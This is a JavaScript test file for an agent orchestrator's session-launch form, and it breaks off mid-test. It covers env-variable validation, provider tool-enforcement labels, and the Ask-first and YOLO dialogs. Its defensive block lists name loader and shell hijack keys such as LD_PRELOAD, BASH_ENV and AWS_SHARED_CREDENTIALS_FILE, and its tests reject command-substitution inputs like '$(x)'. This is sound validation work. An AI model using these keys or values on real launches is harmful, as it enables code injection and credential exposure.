// lib/launch.js: the New session form's rules (spec cao-window-session-launcher; honesty labels
// declaredTools and notEnforced of cao-window-honesty-labels). Tasks 9.1 and 9.3 steps 1-2.
//
// Server rules that the window mirrors are read from the repository at test time, so a drift fails here:
//   src/cli_agent_orchestrator/utils/forwarded_env.py  (env rules)
//   src/cli_agent_orchestrator/utils/enforcement.py    (PROVIDER_ENFORCEMENT, INSTALL_TIME_PROVIDERS,
//                                                       is_restricted, describe_enforcement wording)
//   src/cli_agent_orchestrator/cli/commands/launch.py  (the CLI's own YOLO notes)
//
// Every function is called inside a test case through the namespace, so a function that does not exist
// yet fails its own case with a TypeError, and the rest of the file still runs.
import { spawnSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { assert, finish, test } from "../test/harness.mjs";
import { HARD_WORDS, globDir, needsQuotes, quotedCount, shellArgv } from "../test/shell-argv.mjs";
import { ARG_BODY_MAX, curlRequest, outcomeFrom } from "./cao.js";
import { HONESTY_PENDING } from "./honesty.js";
import * as launch from "./launch.js";
import * as logic from "./logic.js";

const ROOT = new URL("../../../", import.meta.url);
const ENV_PY = new URL("src/cli_agent_orchestrator/utils/forwarded_env.py", ROOT);
const ENF_PY = new URL("src/cli_agent_orchestrator/utils/enforcement.py", ROOT);
const LAUNCH_PY = new URL("src/cli_agent_orchestrator/cli/commands/launch.py", ROOT);
const LAUNCH_JS = new URL("./launch.js", import.meta.url);

const LABEL_DECLARED = "declared by the profile; the server resolves the final set";
const LABEL_NOT_ENFORCED = "not enforced by this provider";
const INSTALL_TIME_LINE = "native at install time (the installed agent's policy applies; launch overrides do not change it)";

const form = (over = {}) => ({ ...launch.emptyForm("/work/repo"), profile: "developer", ...over });
const ctxOf = (over = {}) => ({ resolved: "claude_code", stdin: false, ...over });
const strip = (s) => s.replace(/#.*$/gm, "");
const utf8Len = (s) => new TextEncoder().encode(s).length;

// ---- reading the server's Python source ------------------------------------------------------------

function pyEnv() {
  const text = strip(readFileSync(ENV_PY, "utf8"));
  const quoted = (s) => [...s.matchAll(/"([^"]*)"/g)].map((m) => m[1]);
  const tuple = (n) => quoted(new RegExp(`^${n}\\s*=\\s*\\(([^)]*)\\)`, "m").exec(text)[1]);
  const set = (n) => quoted(new RegExp(`^${n}\\s*=\\s*frozenset\\(\\s*\\{([^}]*)\\}`, "m").exec(text)[1]);
  const num = (n) => new RegExp(`^${n}\\s*=\\s*([0-9 *]+)$`, "m").exec(text)[1].split("*").map((x) => Number(x.trim())).reduce((a, b) => a * b, 1);
  return {
    blockedPrefixes: tuple("FORWARDED_ENV_BLOCKED_PREFIXES"),
    prefixAllowlist: set("FORWARDED_ENV_PREFIX_ALLOWLIST"),
    hijackKeys: set("FORWARDED_ENV_HIJACK_KEYS"),
    hijackPrefixes: tuple("FORWARDED_ENV_HIJACK_PREFIXES"),
    maxEntries: num("FORWARDED_ENV_MAX_ENTRIES"),
    maxKeyBytes: num("FORWARDED_ENV_MAX_KEY_BYTES"),
    maxValueBytes: num("FORWARDED_ENV_MAX_VALUE_BYTES"),
    maxTotalBytes: num("FORWARDED_ENV_MAX_TOTAL_BYTES"),
    entryOverhead: num("_ARGV_ENTRY_OVERHEAD"),
  };
}

function pyEnforcement() {
  const text = strip(readFileSync(ENF_PY, "utf8"));
  const levels = Object.fromEntries([...text.matchAll(/^(NATIVE|PROMPT|NONE)\s*=\s*"(\w+)"/gm)].map((m) => [m[1], m[2]]));
  const dict = /PROVIDER_ENFORCEMENT: Dict\[str, str\] = \{([\s\S]*?)\n\}/.exec(text)[1];
  const providers = Object.fromEntries([...dict.matchAll(/"([a-z_]+)":\s*(NATIVE|PROMPT|NONE)/g)].map((m) => [m[1], levels[m[2]]]));
  const installTime = [...(/INSTALL_TIME_PROVIDERS = frozenset\(\{([^}]*)\}/.exec(text)[1]).matchAll(/"([^"]*)"/g)].map((m) => m[1]).sort();
  const fn = text.slice(text.indexOf("def describe_enforcement"));
  const strings = [...fn.matchAll(/return\s+\(?\s*((?:f?"(?:[^"\\\n]|\\.)*"\s*)+)/g)]
    .map((m) => [...m[1].matchAll(/f?"((?:[^"\\\n]|\\.)*)"/g)].map((x) => x[1]).join(""));
  return { providers, installTime, strings };
}

const envOf = (key, value = "1") => launch.envCheck([{ key, value }]);

// ======================================================================================================
// Profiles, provider, field visibility
// ======================================================================================================

test("Profiles listed: only loadable profiles whose name has no leading dot are offered", () => {
  const rows = [{ name: "developer", loadable: true }, { name: "README", loadable: false }, { name: ".backup", loadable: true }];
  assert.deepEqual(launch.profilesForForm(rows).map((r) => r.name), ["developer"]);
});

test("profilesForForm keeps order, keeps dots inside a name, and survives a missing or malformed answer", () => {
  const rows = [{ name: "b", loadable: true }, { name: "my.profile", loadable: true }, { name: ".", loadable: true }, { name: "a", loadable: true }, { loadable: true }, { name: 7, loadable: true }, null, { name: "nl" }];
  assert.deepEqual(launch.profilesForForm(rows).map((r) => r.name), ["b", "my.profile", "a"]);
  for (const bad of [null, undefined, {}, "x", 3]) assert.deepEqual(launch.profilesForForm(bad), []);
});

test("resolvedProvider: the chosen provider, else the profile's, else kiro_cli", () => {
  assert.equal(launch.resolvedProvider({ provider: "codex" }, { provider: "claude_code" }), "codex");
  assert.equal(launch.resolvedProvider({ provider: "" }, { provider: "claude_code" }), "claude_code");
  assert.equal(launch.resolvedProvider({ provider: "" }, {}), "kiro_cli");
  assert.equal(launch.resolvedProvider({ provider: "" }, undefined), "kiro_cli");
});

// D40 A: the owner removed the Kiro engine and the Claude Code resume id from the form. The window launches with the
// provider's configured default, and the CLI keeps both options for a terminal.
test("No provider-specific field is left: the form has no engine and no resume id, and nothing offers them", () => {
  const empty = launch.emptyForm("/work/repo");
  assert.ok(!("engine" in empty) && !("resumeId" in empty), Object.keys(empty).join(","));
  assert.deepEqual(Object.keys(empty).sort(), ["allowedTools", "async", "env", "idempotencyKey", "memory", "message", "policy", "profile", "provider", "sessionName", "workdir"]);
  assert.equal(launch.fieldVisibility, undefined, "fieldVisibility only said which of those two fields to draw");
  assert.equal(launch.KIRO_ENGINES, undefined, "the engine chips are gone");
});

test("a field that spike 1.3 found refused is listed in CLI_ONLY_FIELDS; spike 1.3 found none, so the list is empty", () => {
  assert.deepEqual(launch.CLI_ONLY_FIELDS, []);
});

test("lib/launch.js does not name the engine or the resume option any more: no form field, no request key, no command option, no answer mapping", () => {
  const src = readFileSync(LAUNCH_JS, "utf8");
  assert.doesNotMatch(src, /\bform\.(engine|resumeId)\b|\bf\.(engine|resumeId)\b|--engine|--resume-session-id|resume_session_id|query\.engine|KIRO_ENGINES|fieldVisibility/);
});

// ======================================================================================================
// Env rules (spec "Env fields follow the server's rules"; utils/forwarded_env.py)
// ======================================================================================================

test("Provider prefix rejected: a CLAUDE key is blocked at its row with the reserved-prefix message", () => {
  const r = envOf("CLAUDE_CONFIG");
  assert.equal(r.ok, false);
  assert.match(r.errors[0].message, /prefix reserved for provider env/);
  assert.deepEqual([r.errors[0].row, r.errors[0].field], [0, "key"]);
});

test("blocked prefixes follow forwarded_env.py: CLAUDE alone and any CLAUDE* key, CODEX_*, __MISE_*; near misses pass", () => {
  for (const k of ["CLAUDE", "CLAUDEX", "CLAUDE_CODE_USE_BEDROCK_X", "CLAUDE_CODE_USE_BEDROCK2", "CODEX_HOME", "__MISE_SHIM"]) {
    assert.equal(envOf(k).ok, false, k);
    assert.match(envOf(k).errors[0].message, /prefix reserved for provider env/, k);
  }
  // startswith is case-sensitive and CODEX/__MISE without the underscore are not prefixes of the tuple
  for (const k of ["claude_x", "CODEX", "CODEXX", "__MISE", "MY_CLAUDE", "XCODEX_A"]) assert.equal(envOf(k).ok, true, k);
});

test("Allowlisted Bedrock key accepted: all six CLAUDE_CODE_USE_* and CLAUDE_CODE_SKIP_*_AUTH keys", () => {
  const six = ["CLAUDE_CODE_USE_BEDROCK", "CLAUDE_CODE_USE_VERTEX", "CLAUDE_CODE_USE_FOUNDRY",
    "CLAUDE_CODE_SKIP_BEDROCK_AUTH", "CLAUDE_CODE_SKIP_VERTEX_AUTH", "CLAUDE_CODE_SKIP_FOUNDRY_AUTH"];
  for (const k of six) assert.deepEqual(envOf(k, "1"), { ok: true, errors: [] }, k);
});

test("Loader key blocked: LD_*, DYLD_* and the shell, interpreter and AWS-config keys, with the loader message", () => {
  for (const k of ["LD_PRELOAD", "LD_LIBRARY_PATH", "LD_X", "DYLD_INSERT_LIBRARIES", "DYLD_X", "PATH", "HOME", "SHELL", "BASH_ENV",
    "ENV", "ZDOTDIR", "PROMPT_COMMAND", "PS1", "PS4", "PYTHONPATH", "PYTHONSTARTUP", "NODE_OPTIONS", "NODE_PATH", "RUBYOPT",
    "PERL5OPT", "GCONV_PATH", "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE"]) {
    const r = envOf(k);
    assert.equal(r.ok, false, k);
    assert.match(r.errors[0].message, /read by the loader, shell or an interpreter when the pane starts/, k);
    assert.equal(r.errors[0].field, "key", k);
  }
});

test("hijack keys are matched exactly and case-sensitively, as the server does; LD and DYLD without the underscore pass", () => {
  for (const k of ["path", "Path", "PATHX", "XPATH", "LD", "LDX", "DYLD", "ld_preload", "AWS_PROFILE", "AWS_REGION", "EDITOR", "GIT_SSH_COMMAND"]) {
    assert.equal(envOf(k).ok, true, k);
  }
});

test("key shape: a letter or underscore first, then ASCII letters, digits and underscores", () => {
  for (const bad of ["1ABC", "A-B", "A B", "A=B", "A.B", "É", "AÉ", "ключ", "A\u0000B", "A\nB", "a​b", "😀", "A$(x)"]) {
    assert.equal(envOf(bad).ok, false, JSON.stringify(bad));
  }
  for (const good of ["_", "_A", "a", "A1", "a_b_C9"]) assert.equal(envOf(good).ok, true, good);
});

test("key length: 128 bytes pass, 129 are blocked", () => {
  assert.equal(envOf("A".repeat(128)).ok, true);
  const r = envOf("A".repeat(129));
  assert.equal(r.ok, false);
  assert.equal(r.errors[0].field, "key");
});

test("value limits: NUL blocked, 2047 bytes pass, 2048 bytes blocked, counted in UTF-8 bytes and not UTF-16 units", () => {
  assert.equal(envOf("OK", "a\u0000b").ok, false);
  assert.equal(envOf("OK", "\u0000").ok, false);
  assert.equal(envOf("OK", "x".repeat(2047)).ok, true);
  assert.equal(envOf("OK", "x".repeat(2048)).ok, false);
  assert.equal(envOf("OK", `${"é".repeat(1023)}x`).ok, true, "2047 bytes in 1024 characters");
  assert.equal(envOf("OK", "é".repeat(1024)).ok, false, "2048 bytes in 1024 characters");
  assert.equal(envOf("OK", "🙂".repeat(511)).ok, true, "2044 bytes");
  assert.equal(envOf("OK", "🙂".repeat(512)).ok, false, "2048 bytes in 1024 UTF-16 units");
  assert.equal(envOf("OK", "").ok, true, "an empty value is allowed");
  assert.equal(envOf("OK", "x".repeat(2048)).errors[0].field, "value");
});

test("a lone surrogate in a value is blocked: the server rejects a value that is not valid UTF-8", () => {
  const r = envOf("OK", "a\ud800b");
  assert.equal(r.ok, false);
  assert.match(r.errors[0].message, /UTF-8/);
});

test("an error never echoes the value (a secret typed as a value must not reach the screen or a log)", () => {
  const secret = "s3cr3t-token-value";
  for (const value of [`${secret}\u0000`, `${secret}${"x".repeat(2100)}`, `${secret}\ud800`]) {
    const r = envOf("OK", value);
    assert.equal(r.ok, false);
    assert.ok(!JSON.stringify(r).includes(secret));
  }
  for (const key of ["LD_PRELOAD", "CLAUDE_X", "1BAD"]) assert.ok(!JSON.stringify(envOf(key, secret)).includes(secret), key);
});

test("only the first violation of a row is reported, and it is the key's when the key is bad", () => {
  const r = launch.envCheck([{ key: "LD_PRELOAD", value: "x".repeat(3000) }]);
  assert.deepEqual(r.errors.map((e) => [e.row, e.field]), [[0, "key"]]);
});

test("entry count: 256 rows pass and 257 are blocked, at the form and not at a row", () => {
  const rows = (n) => Array.from({ length: n }, (_, i) => ({ key: `K${i}`, value: "v" }));
  assert.equal(launch.envCheck(rows(256)).ok, true);
  const r = launch.envCheck(rows(257));
  assert.equal(r.ok, false);
  assert.ok(r.errors.some((e) => e.row === null && e.field === "form"), JSON.stringify(r.errors));
});

test("untouched rows (empty key and empty value) are ignored and are not counted toward 256", () => {
  assert.deepEqual(launch.envCheck([{ key: "", value: "" }]), { ok: true, errors: [] });
  const many = Array.from({ length: 400 }, () => ({ key: "", value: "" }));
  assert.equal(launch.envCheck([...many, { key: "A", value: "1" }]).ok, true);
  assert.equal(launch.envCheck([{ key: "", value: "orphan" }]).ok, false, "a value with no key is an error at its key");
  assert.equal(launch.envCheck([{ key: "A", value: "" }]).ok, true, "a key with an empty value is KEY= and valid");
});

test("total size: keys and values plus 3 bytes per row, 128 KiB passes and one byte more is blocked", () => {
  // 63 rows of key "Knnn" (4) + value 2047 + 3 = 2054 each, then one row that brings the total to a chosen size.
  const build = (total) => {
    const rows = Array.from({ length: 63 }, (_, i) => ({ key: `K${String(i).padStart(3, "0")}`, value: "x".repeat(2047) }));
    const used = rows.reduce((n, r) => n + r.key.length + utf8Len(r.value) + 3, 0);
    const last = { key: "K063", value: "y".repeat(total - used - 4 - 3) };
    assert.ok(last.value.length >= 0 && last.value.length <= 2047);
    return [...rows, last];
  };
  const at = build(128 * 1024);
  assert.equal(at.reduce((n, r) => n + r.key.length + utf8Len(r.value) + 3, 0), 131072);
  assert.equal(launch.envCheck(at).ok, true, "exactly 128 KiB");
  const over = launch.envCheck(build(128 * 1024 + 1));
  assert.equal(over.ok, false);
  assert.match(over.errors.at(-1).message, /128 KiB/);
});

test("Copy drifts from the server: the window's env behaviour covers every key of forwarded_env.py (names the missing key)", () => {
  if (!existsSync(ENV_PY)) return console.log("SKIP - forwarded_env.py not found; env parity not checked");
  const py = pyEnv();
  for (const k of py.hijackKeys) assert.equal(envOf(k).ok, false, `hijack key ${k} is missing from the window's copy`);
  for (const p of py.hijackPrefixes) assert.equal(envOf(`${p}ZZ`).ok, false, `hijack prefix ${p} is missing from the window's copy`);
  for (const p of py.blockedPrefixes) assert.equal(envOf(`${p}ZZ`).ok, false, `blocked prefix ${p} is missing from the window's copy`);
  for (const k of py.prefixAllowlist) assert.equal(envOf(k).ok, true, `allowlisted key ${k} is missing from the window's copy`);
});

test("Copy drifts from the server: the window's env tables equal forwarded_env.py, names every difference", () => {
  if (!existsSync(ENV_PY)) return console.log("SKIP - forwarded_env.py not found; env parity not checked");
  const py = pyEnv();
  const js = launch.ENV_RULES;
  const diff = (name, a, b) => {
    const missing = a.filter((x) => !b.includes(x));
    const extra = b.filter((x) => !a.includes(x));
    assert.deepEqual({ missing, extra }, { missing: [], extra: [] }, `${name} differs from utils/forwarded_env.py`);
  };
  diff("blocked prefixes", py.blockedPrefixes, js.blockedPrefixes);
  diff("prefix allowlist", py.prefixAllowlist, js.prefixAllowlist);
  diff("hijack keys", py.hijackKeys, js.hijackKeys);
  diff("hijack prefixes", py.hijackPrefixes, js.hijackPrefixes);
  assert.deepEqual(
    [js.maxEntries, js.maxKeyBytes, js.maxValueBytes, js.maxTotalBytes, js.entryOverhead],
    [py.maxEntries, py.maxKeyBytes, py.maxValueBytes, py.maxTotalBytes, py.entryOverhead],
    "a limit differs from utils/forwarded_env.py",
  );
});

test("the env table in lib/launch.js carries a header naming utils/forwarded_env.py", () => {
  const text = readFileSync(LAUNCH_JS, "utf8");
  const at = text.indexOf("ENV_RULES =");
  assert.ok(at > 0, "ENV_RULES is not defined in lib/launch.js");
  assert.match(text.slice(0, at), /\/\/[^\n]*utils\/forwarded_env\.py/);
});

// ======================================================================================================
// Enforcement tables and the Ask-first dialog
// ======================================================================================================

test("enforcementFor words every provider and policy exactly as describe_enforcement does (oracle read from enforcement.py)", () => {
  if (!existsSync(ENF_PY)) return console.log("SKIP - enforcement.py not found; enforcement parity not checked");
  const py = pyEnforcement();
  const [installTime, native, unrestricted, prompt, none] = py.strings;
  const policies = { restricted: ["fs_read"], star: ["*"], mixed: ["fs_read", "*"], empty: [], unset: null };
  for (const provider of [...Object.keys(py.providers), "unknown_provider", ""]) {
    for (const [pname, tools] of Object.entries(policies)) {
      const level = py.providers[provider] ?? "none";
      const restricted = tools !== null && !tools.includes("*");
      let want;
      if (level === "native" && py.installTime.includes(provider)) want = installTime;
      else if (level === "native") want = native;
      else if (!restricted) want = unrestricted.replace("{level}", level);
      else want = level === "prompt" ? prompt : none;
      const got = launch.enforcementFor(provider, tools);
      assert.equal(got.text, want, `${provider} with ${pname}`);
      assert.equal(got.level, level, `${provider} level`);
      assert.equal(got.restricted, restricted, `${provider} with ${pname} restricted`);
    }
  }
});

test("Copy drifts from the server: the enforcement tables equal enforcement.py", () => {
  if (!existsSync(ENF_PY)) return console.log("SKIP - enforcement.py not found; enforcement parity not checked");
  const py = pyEnforcement();
  assert.deepEqual({ ...launch.PROVIDER_ENFORCEMENT }, py.providers, "PROVIDER_ENFORCEMENT differs from utils/enforcement.py");
  assert.deepEqual([...launch.INSTALL_TIME_PROVIDERS].sort(), py.installTime, "INSTALL_TIME_PROVIDERS differs from utils/enforcement.py");
  const t = launch.ENFORCEMENT_TEXT;
  assert.deepEqual([t.installTime, t.native, t.unrestricted, t.prompt, t.none], py.strings, "describe_enforcement wording differs");
  assert.equal(t.installTime, INSTALL_TIME_LINE);
});

test("the enforcement tables in lib/launch.js carry a header naming utils/enforcement.py", () => {
  const text = readFileSync(LAUNCH_JS, "utf8");
  const at = text.indexOf("PROVIDER_ENFORCEMENT =");
  assert.ok(at > 0, "PROVIDER_ENFORCEMENT is not defined in lib/launch.js");
  assert.match(text.slice(0, at), /\/\/[^\n]*utils\/enforcement\.py/);
});

const DEV = { name: "developer", role: "developer", allowedTools: ["fs_read", "fs_list"] };

test("Native provider: the dialog shows the declared tools with their label and says the provider refuses blocked tools", () => {
  const d = launch.askFirstDialog(DEV, "claude_code", null);
  assert.deepEqual(d.tools, ["fs_read", "fs_list"]);
  assert.equal(d.role, "developer");
  assert.equal(d.toolsLabel, LABEL_DECLARED);
  assert.match(d.enforcement, /the provider refuses blocked tools/);
  assert.equal(d.enforced, true);
  assert.equal(d.notEnforcedLabel, null);
});

test("Override on an install-time provider with Ask first: install-time wording, the override is not presented as enforced", () => {
  const d = launch.askFirstDialog(DEV, "kiro_cli", ["fs_read"]);
  assert.equal(d.enforcement, INSTALL_TIME_LINE);
  assert.equal(d.enforced, false);
  assert.match(d.overrideNote, /replaces the profile's policy/);
  assert.equal(d.notEnforcedLabel, null, "kiro_cli is native at install time; the label is for prompt-only and none providers");
  const o = launch.askFirstDialog(DEV, "opencode_cli", ["fs_read"]);
  assert.deepEqual([o.enforcement, o.enforced], [INSTALL_TIME_LINE, false]);
});

test("an install-time provider says the installed agent's policy applies even when nothing is overridden", () => {
  for (const p of ["kiro_cli", "opencode_cli"]) {
    const d = launch.askFirstDialog(DEV, p, null);
    assert.equal(d.enforcement, INSTALL_TIME_LINE, p);
    assert.equal(d.enforced, false, p);
    assert.equal(d.overrideNote, null, p);
  }
});

test("a native provider with an override names the override as replacing the profile's policy and keeps enforced true", () => {
  const d = launch.askFirstDialog(DEV, "claude_code", ["fs_read"]);
  assert.match(d.overrideNote, /replaces the profile's policy/);
  assert.equal(d.enforced, true);
});

test("Prompt-only provider: the declared tools, 'not enforced by this provider', and the agent is told, not prevented", () => {
  const d = launch.askFirstDialog(DEV, "codex", null);
  assert.equal(d.notEnforcedLabel, LABEL_NOT_ENFORCED);
  assert.match(d.enforcement, /told, not prevented/);
  assert.equal(d.toolsLabel, LABEL_DECLARED);
  assert.deepEqual(d.tools, ["fs_read", "fs_list"]);
  assert.equal(d.enforced, false);
});

test("a provider with no enforcement (none, or one the table does not know) also says 'not enforced' for a restricted policy", () => {
  for (const p of ["hermes", "cursor_cli", "mock_cli", "a_provider_nobody_heard_of"]) {
    const d = launch.askFirstDialog(DEV, p, null);
    assert.equal(d.notEnforcedLabel, LABEL_NOT_ENFORCED, p);
    assert.match(d.enforcement, /runs unrestricted/, p);
  }
});

test("an unrestricted policy is not 'not enforced': there is nothing to enforce", () => {
  const star = launch.askFirstDialog({ name: "x", allowedTools: ["*"] }, "codex", null);
  assert.equal(star.notEnforcedLabel, null);
  assert.match(star.enforcement, /not applicable: the policy is unrestricted/);
  assert.equal(launch.askFirstDialog(DEV, "codex", ["*"]).notEnforcedLabel, null, "an override of * is unrestricted");
});

test("a profile that declares no tools is treated as restricted: the CLI resolves a role default that is not *", () => {
  assert.equal(launch.askFirstDialog({ name: "x", role: "developer" }, "codex", null).notEnforcedLabel, LABEL_NOT_ENFORCED);
});

test("the dialog does not change the profile or the override it is given", () => {
  const profile = Object.freeze({ name: "p", role: "r", allowedTools: Object.freeze(["fs_read"]) });
  const override = Object.freeze(["fs_write"]);
  launch.askFirstDialog(profile, "codex", override);
  launch.askFirstDialog(profile, "kiro_cli", null);
});

// ---- YOLO ------------------------------------------------------------------------------------------

test("YOLO on an install-time provider: the typed-name dialog also shows the install-time line and the CLI's own note", () => {
  const k = launch.yoloDialog(DEV, "kiro_cli");
  assert.equal(k.danger, true);
  assert.equal(k.installTime.line, INSTALL_TIME_LINE);
  assert.match(k.installTime.note, /--yolo does not widen kiro_cli's tool set/);
  const o = launch.yoloDialog(DEV, "opencode_cli");
  assert.equal(o.installTime.line, INSTALL_TIME_LINE);
  assert.match(o.installTime.note, /--yolo has no runtime effect on opencode_cli/);
});

test("the CLI's YOLO notes are the ones launch.py prints (names the CLI wording when it moves)", () => {
  if (!existsSync(LAUNCH_PY)) return console.log("SKIP - launch.py not found; YOLO note parity not checked");
  const py = readFileSync(LAUNCH_PY, "utf8");
  for (const [provider, phrase] of [["kiro_cli", "--yolo does not widen kiro_cli's tool set"], ["opencode_cli", "--yolo has no runtime effect on opencode_cli"]]) {
    assert.ok(py.includes(phrase), `launch.py no longer says: ${phrase}`);
    assert.ok(launch.yoloDialog(DEV, provider).installTime.note.includes(phrase), provider);
  }
});

test("YOLO on a native provider has no install-time line", () => {
  for (const p of ["claude_code", "codex", "copilot_cli"]) assert.equal(launch.yoloDialog(DEV, p).installTime, null, p);
});

test("YOLO on an install-time provider is not presented as lifting the agent's own policy", () => {
  // Every string of the view model except the CLI's own note (which says what YOLO does not do).
  const strings = (v, skip) => {
    if (typeof v === "string") return [v];
    if (Array.isArray(v)) return v.flatMap((x) => strings(x, skip));
    if (v && typeof v === "object") return Object.entries(v).filter(([k]) => k !== skip).flatMap(([, x]) => strings(x, skip));
    return [];
  };
  for (const p of ["kiro_cli", "opencode_cli"]) {
    const d = launch.yoloDialog(DEV, p);
    const text = strings({ ...d, installTime: { line: d.installTime.line } }, "note").join("\n");
    assert.ok(text.includes(INSTALL_TIME_LINE), p);
    assert.doesNotMatch(text, /every tool|all tools|any tool|full access|without (any )?restriction|unrestricted/i, `${p}: ${text}`);
  }
});

test("YOLO typed confirmation: the button needs the exact session name", () => {
  assert.equal(launch.yoloConfirmEnabled("my-session", "my-session"), true);
  for (const typed of ["other", "", "my-session ", " my-session", "My-Session", "my-sessio", "my-session\n"]) {
    assert.equal(launch.yoloConfirmEnabled(typed, "my-session"), false, JSON.stringify(typed));
  }
  assert.equal(launch.yoloConfirmEnabled("", ""), false, "no session name: nothing to confirm");
});

test("Reopened form: the policy is Ask first and nothing from a YOLO launch is remembered", () => {
  assert.equal(launch.policyDefault(), "ask");
  const fresh = launch.emptyForm("/work/repo");
  assert.equal(fresh.policy, "ask");
  const yolo = { ...fresh, policy: "yolo", sessionName: "s", env: [{ key: "A", value: "1" }] };
  assert.equal(launch.emptyForm("/work/repo").policy, "ask");
  assert.deepEqual(launch.emptyForm("/work/repo").env, []);
  assert.equal(yolo.policy, "yolo");
});

test("emptyForm hands out independent forms: editing one does not edit the next", () => {
  const a = launch.emptyForm("/w");
  a.env.push({ key: "A", value: "1" });
  a.allowedTools.push("fs_read");
  const b = launch.emptyForm("/w");
  assert.deepEqual([b.env, b.allowedTools], [[], []]);
});

// ======================================================================================================
// Name, directory, blocking
// ======================================================================================================

test("Bad session name: 'my session' is refused with the letters, digits, - and _ message", () => {
  const r = launch.nameCheck("my session");
  assert.equal(r.ok, false);
  assert.match(r.message, /only letters, digits, - and _/);
});

test("session names: letters, digits, - and _ pass; anything else is refused; empty means the server picks one", () => {
  for (const good of ["a", "my_session-1", "A1", "_", "x".repeat(60)]) assert.equal(launch.nameCheck(good).ok, true, good);
  for (const bad of ["a b", "a.b", "a/b", "../x", "a:b", "é", "a\nb", "ok\n", " ok", "ok ", "a;b", "$(x)", "😀", "  "]) {
    assert.equal(launch.nameCheck(bad).ok, false, JSON.stringify(bad));
  }
  assert.deepEqual([launch.nameCheck("").ok, launch.nameCheck("").message], [true, null]);
  assert.equal(launch.nameCheck("ok").preview, "cao-ok");
});

test("First launch: the directory field starts empty and Launch is blocked without it", () => {
  assert.equal(launch.workdirPrefill(undefined), "");
  assert.equal(launch.emptyForm(undefined).workdir, "");
  const w = launch.workdirCheck("");
  assert.equal(w.ok, false);
  assert.match(w.message, /a directory on the CAO machine is needed/);
  assert.match(launch.workdirCheck("   ").message, /a directory on the CAO machine is needed/);
  assert.equal(launch.workdirCheck("\t\n").ok, false);
  assert.deepEqual(launch.launchBlocked(form({ workdir: "" }), ctxOf()).problems.map((p) => p.field), ["workdir"]);
});

test("Prefill after a launch: the directory last launched from is offered; a non-string is not", () => {
  assert.equal(launch.workdirPrefill("/work/repo"), "/work/repo");
  assert.equal(launch.emptyForm("/work/repo").workdir, "/work/repo");
  for (const bad of [null, 0, {}, ["/x"], true]) assert.equal(launch.workdirPrefill(bad), "", JSON.stringify(bad));
  assert.equal(launch.workdirCheck("/work/repo").ok, true);
  assert.equal(launch.workdirCheck("/work/my repo").ok, true, "a directory with a space is a directory");
});

test("launchBlocked reports each problem at its field, in form order, so focus goes to the first", () => {
  assert.deepEqual(launch.launchBlocked(form(), ctxOf()), { blocked: false, problems: [], useCli: false });
  assert.deepEqual(launch.launchBlocked(form({ profile: "" }), ctxOf()).problems.map((p) => p.field), ["profile"]);
  assert.deepEqual(launch.launchBlocked(form({ sessionName: "a b" }), ctxOf()).problems.map((p) => p.field), ["sessionName"]);
  const all = launch.launchBlocked(form({ profile: "", sessionName: "a b", workdir: "" }), ctxOf());
  assert.deepEqual(all.problems.map((p) => p.field), ["profile", "sessionName", "workdir"]);
  assert.equal(all.blocked, true);
  assert.match(all.problems[1].message, /only letters, digits, - and _/);
});

test("YOLO without a name: blocked at the session name field with 'a session name is needed to confirm'", () => {
  const r = launch.launchBlocked(form({ policy: "yolo", sessionName: "" }), ctxOf());
  assert.equal(r.blocked, true);
  assert.equal(r.problems[0].field, "sessionName");
  assert.match(r.problems[0].message, /a session name is needed to confirm/);
  assert.equal(launch.launchBlocked(form({ policy: "yolo", sessionName: "s" }), ctxOf()).blocked, false);
  assert.equal(launch.launchBlocked(form({ policy: "auto", sessionName: "" }), ctxOf()).blocked, false, "auto-approve needs no name");
  assert.equal(launch.launchBlocked(form({ policy: "ask", sessionName: "" }), ctxOf()).blocked, false);
});

test("a bad env row blocks Launch at the env field and carries the row", () => {
  const r = launch.launchBlocked(form({ env: [{ key: "OK", value: "1" }, { key: "LD_PRELOAD", value: "x" }] }), ctxOf({ stdin: true }));
  assert.equal(r.blocked, true);
  assert.deepEqual([r.problems[0].field, r.problems[0].row], ["env", 1]);
  assert.match(r.problems[0].message, /read by the loader, shell or an interpreter when the pane starts/);
});

test("Env row filled: Launch is disabled with the note while stdin is off, and the form falls back to the command", () => {
  const f = form({ env: [{ key: "API_URL", value: "https://example.test" }] });
  const off = launch.launchBlocked(f, ctxOf({ stdin: false }));
  assert.equal(off.blocked, true);
  assert.equal(off.useCli, true);
  assert.ok(off.problems.some((p) => p.message === "env values are not sent from this window"), JSON.stringify(off.problems));
  const none = launch.launchBlocked(f, {});
  assert.deepEqual([none.blocked, none.useCli], [true, true], "with no context the safe answer is to block");
});

test("Env row filled with stdin on: the env rules apply and nothing else blocks", () => {
  const f = form({ env: [{ key: "API_URL", value: "https://example.test" }] });
  assert.deepEqual(launch.launchBlocked(f, ctxOf({ stdin: true })), { blocked: false, problems: [], useCli: false });
});

test("No env rows: Launch is enabled; untouched rows do not count as filled", () => {
  assert.equal(launch.launchBlocked(form(), ctxOf()).blocked, false);
  assert.equal(launch.launchBlocked(form({ env: [{ key: "", value: "" }, { key: "", value: "" }] }), ctxOf()).blocked, false);
});

test("a field marked CLI only by spike 1.3 blocks Launch when it is filled, with the message 'CLI only'", () => {
  const r = launch.launchBlocked(form({ memory: true }), ctxOf({ cliOnly: ["memory"] }));
  assert.equal(r.blocked, true);
  assert.equal(r.problems[0].message, "CLI only");
  assert.equal(launch.launchBlocked(form({ memory: false }), ctxOf({ cliOnly: ["memory"] })).blocked, false);
});

// ======================================================================================================
// The request
// ======================================================================================================

test("Ask-first launch: one POST /sessions with the profile, the directory and a key, no allowed_tools, the message in the body", () => {
  const r = launch.buildRequest(form({ message: "Run the tests", idempotencyKey: "k1" }), ctxOf());
  assert.deepEqual([r.method, r.path], ["POST", "/sessions"]);
  assert.deepEqual(r.query, { agent_profile: "developer", working_directory: "/work/repo", idempotency_key: "k1" });
  assert.deepEqual(r.body, { initial_message: "Run the tests" });
  assert.match(r.cli, /cao launch/);
});

test("buildRequest maps every field the form has", () => {
  const f = form({ provider: "kiro_cli", sessionName: "s1", allowedTools: ["fs_read", "fs_list"], memory: true, idempotencyKey: "k" });
  assert.deepEqual(launch.buildRequest(f, ctxOf({ resolved: "kiro_cli" })).query, {
    agent_profile: "developer", provider: "kiro_cli", session_name: "s1", working_directory: "/work/repo",
    allowed_tools: "fs_read,fs_list", memory_manager: "true", idempotency_key: "k",
  });
});

test("the request carries no engine and no resume_session_id for any provider, even from a form that still holds the old fields", () => {
  const stale = form({ engine: "kas", resumeId: "r1", memory: true, idempotencyKey: "k" });
